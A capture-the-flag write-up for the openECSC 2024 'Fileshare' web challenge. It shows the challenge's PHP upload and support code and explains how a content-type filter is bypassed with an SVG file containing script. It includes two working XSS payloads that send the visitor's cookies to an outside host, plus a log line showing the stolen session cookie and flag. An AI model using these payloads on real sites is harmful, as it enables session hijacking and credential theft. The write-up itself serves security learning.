# Fileshare

## Description
```
You can now share your files for free thanks to our new disruptive technology!

Site: https://fileshare.challs.open.ecsc2024.it
```

## Provided Files
```
- fileshare.zip
```

## Writeup

Starting off, I took a look at the provided files. <br/>
```php
<?php
session_start();

include_once('header.php');

if (isset($_POST['email']) || isset($_POST['fileid']) || isset($_POST['message'])) {
    
    $fileid = $_POST['fileid'];
    if (preg_match('/^[a-f0-9]{30}$/', $fileid) === 1) {

        $url = 'http://' . getenv('HEADLESS_HOST');
        $chall_url = 'http://' . getenv('WEB_DOM');
        $act1 = array('type' => 'request', 'url' => $chall_url);
        $act2 = array('type' => 'set-cookie', 'name' => 'flag', 'value' => getenv('FLAG'));
        $act3 = array('type' => 'request', 'url' => $chall_url . '/download.php?id=' . $fileid);
        
        $data = array('actions' => [$act1, $act2, $act3], 'browser' => 'chrome');
        $data = json_encode($data);

        $options = array(
            'http' => array(
                'header'  => "Content-type: application/json\r\n" . "X-Auth: " . getenv('HEADLESS_AUTH') . "\r\n",
                'method'  => 'POST',
                'content' => $data
            )
        );

        $context  = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            echo '<div class="alert alert-danger" role="alert">Sorry, there was an error sending your message.</div>';
        } else {
            echo '<div class="alert alert-success" role="alert">Thank you, we are taking care of your problem!</div>';
        }
        
    } else {
        echo '<div class="alert alert-success" role="alert">Thank you for your submission</div>';
    }
}

?>
```

I found the flag being passed as cookie again in the `support.php` endpoint which indicated a `XSS` vulnerability of some kind. <br/>
Taking a look at the `upload.php` endpoint revealed a filter in the file upload function. <br/>
```php
<?php
session_start();

include_once('header.php');
include_once('db.php');

if( isset($_FILES['file']) ) {
    $target_dir = "/uploads/";

    $fileid = bin2hex(random_bytes(15));
    $target_file = $target_dir . $fileid;

    $type = $_FILES["file"]["type"];
    // I don't like the letter 'h'
    if ($type == "" || preg_match("/h/i", $type) == 1){
        $type = "text/plain";
    }

    $db = db_connect();
    $stmt = $db->prepare('INSERT INTO files (id, filename, content_type, size) VALUES (?, ?, ?, ?)');
    $stmt->bindParam(1, $fileid);
    $stmt->bindParam(2, $_FILES["file"]["name"]);
    $stmt->bindParam(3, $type);
    $stmt->bindParam(4, $_FILES["file"]["size"]);
    $stmt->execute();
    $db->close();

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        echo '<div class="alert alert-success" role="alert">The file '. htmlspecialchars( basename( $_FILES["file"]["name"])). " has been uploaded <a href=\"/download.php?id=$fileid\">here</a>.</div>";
        
    
        if (isset($_SESSION['files']) && is_array($_SESSION['files'])) {
            $_SESSION['files'][] = $fileid;
        } else {
            $_SESSION['files'] = [$fileid];
        }
    } else {
        echo '<div class="alert alert-danger" role="alert">Sorry, there was an error uploading your file.</div>';
    }
}

?>
```

The filter would basically demote any files with an `h` in the extension name to a `.txt` file. <br/>
This would convert a `.html` file which could possibly execute some malicious javascript code when accessed to a simple `.txt` file which does only dispaly the files contents when being accessed through the browser. <br/>
To bypass this filter I used a `.svg` file which is essentially an image vector file but it actually also allows the passing of `javascript` code. <br/>
```xml
<svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
     width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
  <script type="text/javascript">
    fetch(`https://eovbebh4rmd668f.m.pipedream.net/${encodeURI(document.cookie)}`)
  </script>
</svg>
```

Uploading this file and accessing its location actually triggered a request to my vserver, but testing this on the support page didn't trigger a request. <br/>
After some tampering with the javascript in the `.svg` file I essentially found a workaround for the request being made. <br/>
```xml
<svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
     width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
  <script type="text/javascript">
    window.location.replace(`https://aryt3.dev/${encodeURI(document.cookie)}`)
  </script>
</svg>
```

Watching the `nginx-access-log` I got a request with the flag being passed along via the URL which concludes this writeup. <br/>
```
XXX.XXX.XXX.XXX - - [20/Mar/2024:22:47:26 +0100] "GET /PHPSESSID=e191d9b20de1a6d0ee0cfc120880c18f;%20flag=openECSC%7Bwhy_w0uld_u_sh4re_th1s%7D HTTP/1.1" 291 621 "firefox-headless-agent"
```